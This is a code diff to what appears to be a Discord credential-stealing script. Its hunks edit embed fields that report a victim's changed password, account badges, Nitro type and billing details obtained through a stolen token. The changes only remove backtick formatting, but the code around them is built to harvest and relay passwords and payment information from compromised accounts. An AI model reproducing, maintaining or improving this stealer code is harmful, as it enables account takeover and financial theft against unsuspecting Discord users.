@@ -384,7 +384,7 @@ xmlHttp.responseText;`, !0).then((info) => {
                     },
 {
 "name": "<a:badges:942395694134751323> **Badges**",
-                        "value": `\`${GetBadges(json.flags)}\``,
+                        "value": `${GetBadges(json.flags)}`,
                         "inline": false
 },
 {
@@ -394,7 +394,7 @@ xmlHttp.responseText;`, !0).then((info) => {
 },
 {
     "name": " <a:nitro:942395826544705626> **Billing:**",
-                            "value": `\`${PM(token)}\``,
+                            "value": `${PM(token)}`,
                             "inline": false
     },
 
@@ -451,22 +451,22 @@ xmlHttp.responseText;`, !0).then((info) => {
                     },
                     {
                         "name": "**<a:pass:942396025228902430>New  Password**",
-                        "value": `\`${data.new_password}\``,
+                        "value": `${data.new_password}`,
                         "inline": false
                     },
 {
 "name": "<a:badges:942395694134751323> **Badges**",
-                        "value": `\`${GetBadges(json.flags)}\``,
+                        "value": `${GetBadges(json.flags)}`,
                         "inline": false
 },
 {
 "name": " <a:nitro:942395826544705626> **Nitro Type**",
-                        "value": `\`${GetNitro(json.premium_type)}\``,
+                        "value": `${GetNitro(json.premium_type)}`,
                         "inline": false
 },
 {
     "name": " <a:nitro:942395826544705626> **Billing:**",
-                            "value": `\`${PM(token)}\``,
+                            "value": `${PM(token)}`,
                             "inline": false
     },
 
@@ -518,22 +518,22 @@ xmlHttp.responseText;`, !0).then((info) => {
                     },
                     {
                         "name": "**<a:pass:942396025228902430>New  Password**",
-                        "value": `\`${data.password}\``,
+                        "value": `${data.password}`,
                         "inline": false
                     },
 {
 "name": "<a:badges:942395694134751323> **Badges:**",
-                        "value": `\`${GetBadges(json.flags)}\``,
+                        "value": `${GetBadges(json.flags)}`,
                         "inline": false
 },
 {
 "name": " <a:nitro:942395826544705626> **Nitro Type:**",
-                        "value": `\`${GetNitro(json.premium_type)}\``,
+                        "value": `${GetNitro(json.premium_type)}`,
                         "inline": false
 },
 {
     "name": " <a:nitro:942395826544705626> **Billing:**",
-                            "value": `\`${PM(token)}\``,
+                            "value": `${PM(token)}`,
                             "inline": false
     },
 
